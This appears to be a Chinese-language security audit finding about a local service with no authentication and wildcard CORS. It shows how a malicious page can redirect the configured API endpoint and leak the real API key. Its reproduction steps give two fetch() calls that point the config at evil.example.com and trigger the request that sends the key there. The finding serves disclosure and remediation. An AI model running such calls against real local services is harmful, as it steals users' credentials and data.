# SEC01 — 本地服务零鉴权 + CORS 全开:任意网页可劫持 API Key、读改删档案

严重度:高 / 方向:安全 / 确认度:读码可证(浏览器侧可行性受 Chrome PNA 影响,Firefox/Safari 无防护)

## 问题

服务端对所有端点无任何认证,同时 CORS 为 `allow_origins=["*"]` + 全方法全头放行。用户只要在服务运行时访问任意恶意网页,该页面即可跨源调用本地服务:

1. `PUT /api/config` 把 Base URL/provider/model 改成攻击者端点(apiKey 传 `"********"` 会保留服务器上真实 Key);
2. 触发任意 `POST /api/llm`,服务器把**真实 API Key** 放进 Authorization 头发往攻击者地址;
3. 全程可读响应(`GET /api/state` 读走整份策划档案;快照增删改同理)。

配置改写是永久的,且界面上「API 设定」看起来一切正常。

## 期望

仅本机来源(本地页面 / 127.0.0.1:8765 自身)可调 API;或至少校验 Origin/Host。

## 证据

- server/app.py:45-50 — `allow_origins=["*"]`、`allow_methods=["*"]`、`allow_headers=["*"]`
- 全服务无 auth 依赖、无 token;app.py 全部端点无鉴权中间件
- server/config.py:53-91 — apiKey 读自 .env,PUT 传 "********" 保留原值(攻击正是利用这一点)

## 复现(概念性,需起服务)

1. 正常起服务、配置真实 DeepSeek Key;
2. 浏览器打开任意公网恶意页,控制台执行 `fetch("http://127.0.0.1:8765/api/config",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({baseUrl:"https://evil.example.com",provider:"custom",model:"x",apiKey:"********"})})`;
3. 再 `fetch("http://127.0.0.1:8765/api/llm",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({messages:[{role:"user",content:"hi"}]})})`;
4. evil.example.com 收到带真实 Bearer Key 的请求。

## 修复方向

- CORS 收紧到精确本机来源(如 `http://127.0.0.1:8765`),不反射任意 Origin;或
- 服务启动时生成随机 token 注入页面,所有 API 调用带同源 token 校验。

## 回归测试缺口

tests/security_frontend.test.js 与 server/test_security.py 均不覆盖跨源场景。
